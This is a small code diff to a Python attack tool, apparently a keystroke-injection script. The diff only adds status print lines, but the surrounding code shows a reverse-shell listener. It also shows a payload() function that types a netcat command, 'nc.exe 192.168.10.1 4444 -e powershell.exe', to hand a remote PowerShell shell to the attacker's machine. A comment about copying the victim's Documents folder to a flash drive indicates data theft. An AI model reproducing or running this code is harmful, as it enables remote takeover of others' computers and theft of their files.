@@ -53,7 +53,9 @@ def reverse_shell_listener():
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
 			data = recv_timeout(conn) # Receive output from command.
 			print(data) # Print the output of the command.
+		print("Letting copy finish")
 		sleep(15)
+		print("Copy should have finished")
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
 		exit() # Using [ctrl+c] will terminate the listener.
@@ -81,7 +83,9 @@ def payload():
 	shelllistener.start()
 	eco.type("./nc.exe 192.168.10.1 4444 -v -e powershell.exe")
 	eco.press("ENTER")
+	print("Waiting for shell to exit")
 	shelllistener.join()
+	print("Shell exited")
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
 	httplistener.join()
